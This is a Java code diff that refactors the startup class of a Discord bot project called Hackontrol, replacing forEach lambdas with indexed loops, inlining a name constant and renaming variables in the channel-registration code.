@@ -26,8 +26,7 @@ public class Hackontrol {
 	public static final RegistryType<Void, Class<? extends Manager>> MANAGER_REGISTRY = RegistryType.create();
 	public static final RegistryType<Void, Class<? extends HackontrolChannel>> CHANNEL_REGISTRY = RegistryType.create();
 
-	public static final String NAME = "Hackontrol";
-	public static final Logger LOGGER = LoggerFactory.getLogger(Hackontrol.NAME);
+	public static final Logger LOGGER = LoggerFactory.getLogger("Hackontrol");
 
 	private static Hackontrol INSTANCE;
 
@@ -46,10 +45,20 @@ public class Hackontrol {
 		StrictClassValueOnlyRegistryImplementation<HackontrolChannel> channelRegistryImplementation = StrictClassValueOnlyRegistryImplementation.create(Hackontrol.CHANNEL_REGISTRY, HackontrolChannel.class);
 		ChannelRegistry.register(channelRegistryImplementation);
 		this.channelList = channelRegistryImplementation.getList();
-		this.channelList.forEach(channel -> Hackontrol.LOGGER.info("Registered channel: {}", channel.getClass().getName()));
+
+		for(int i = 0; i < this.channelList.size(); i++) {
+			HackontrolChannel channel = this.channelList.get(i);
+			Hackontrol.LOGGER.info("Registered channel: {}", channel.getClass().getName());
+		}
+
 		this.registrationHandler = new RegistrationHandler();
 		JDABuilder builder = JDABuilder.createDefault(Token.BOT_TOKEN).enableIntents(GatewayIntent.MESSAGE_CONTENT);
-		this.managerList.forEach(manager -> manager.configureBuilder(builder));
+
+		for(int i = 0; i < this.managerList.size(); i++) {
+			Manager manager = this.managerList.get(i);
+			manager.configureBuilder(builder);
+		}
+
 		this.bot = builder.build();
 
 		try {
@@ -63,18 +72,21 @@ public class Hackontrol {
 		this.category = DiscordUtils.getOrCreateCategory(this.guild, identifier);
 
 		for(int i = 0; i < this.channelList.size(); i++) {
-			HackontrolChannel hackontrolChannel = this.channelList.get(i);
-			String channelName = hackontrolChannel.getName();
-			TextChannel channel = DiscordUtils.getOrCreateTextChannelInCategory(this.category, channelName);
-			hackontrolChannel.channel = channel;
-			hackontrolChannel.register(this.registrationHandler.createRegistry(hackontrolChannel));
+			HackontrolChannel channel = this.channelList.get(i);
+			String channelName = channel.getName();
+			TextChannel textChannel = DiscordUtils.getOrCreateTextChannelInCategory(this.category, channelName);
+			channel.channel = textChannel;
+			channel.register(this.registrationHandler.createRegistry(channel));
 
-			if(DiscordUtils.isChannelEmpty(channel)) {
-				hackontrolChannel.initialize();
+			if(DiscordUtils.isChannelEmpty(textChannel)) {
+				channel.initialize();
 			}
 		}
 
-		this.managerList.forEach(manager -> manager.initialize(this.registrationHandler));
+		for(int i = 0; i < this.managerList.size(); i++) {
+			Manager manager = this.managerList.get(i);
+			manager.initialize(this.registrationHandler);
+		}
 	}
 
 	public List<Manager> getManagerList() {
